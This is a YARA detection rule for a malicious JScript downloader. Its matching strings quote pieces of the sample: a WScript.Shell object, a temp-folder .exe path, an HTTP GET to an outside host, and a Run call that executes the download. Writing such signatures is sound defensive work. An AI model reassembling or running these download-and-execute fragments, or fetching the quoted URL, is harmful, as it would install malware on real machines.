rule sig_20160329_eda2f8ef7347ae5b6843bbb0eb41aeda {
  meta:
    description = "datamaliciousorder - file 20160329_eda2f8ef7347ae5b6843bbb0eb41aeda.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e2dc079c414a680f8b6b829ec929efde17860c5271769e693270c6f79fea13f4"

  strings:
    $s1  = "function Viaajvjmk() {return Omuzatmuwr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"JNPZQ5ZVLaAt0.exe\";};" fullword ascii
    $s2  = "do {WScript[Eljhals](Hdozditd() * 11)} while (Jamixkkua[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Jamixkkua[Wbijpqxdun](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "var Omuzatmuwr = function Txlmftsy() {return WScript[Ijjxateqzy](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Awnxm(Jxzzrsri, Goeuucme){return Jxzzrsri - Goeuucme;};" fullword ascii
    $s6  = "function Drorz() {return ((Pvpvcrbeym == true) && (Pvpvcrbeym == Rymeobke)) ? 1 : Pedauotm;};" fullword ascii
    $s7  = "function Xfurr(Zglatyhlid){Omuzatmuwr[\"Run\"](Zglatyhlid, Pedauotm, Pedauotm);};" fullword ascii
    $s8  = "return Awnxm(Ejrnqcqvt, Itykythr);" fullword ascii
    $s9  = "function Lryup()" fullword ascii
    $s10 = "function Hdozditd(){return 22;};" fullword ascii
    $s11 = "Pvpvcrbeym = true; " fullword ascii
    $s12 = "Rymeobke = true; " fullword ascii
    $s13 = "function Jpxulccsad(){return Frerhuitx;};" fullword ascii
    $s14 = " while (Thrva){" fullword ascii
    $s15 = "var Xfutglomg = false;" fullword ascii
    $s16 = "var Gtwbumokl = new this[\"Date\"]();" fullword ascii
    $s17 = "var Pvpvcrbeym = false;" fullword ascii
    $s18 = "function Euxolbcbxp(){return Ijjxateqzy;};" fullword ascii
    $s19 = "var Rymeobke = false;" fullword ascii
    $s20 = "function Wtjqawuuxq(Nebajqivyj) {var Pcycicjekv = (1, 2, 3, 4, 5, Nebajqivyj); return Pcycicjekv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}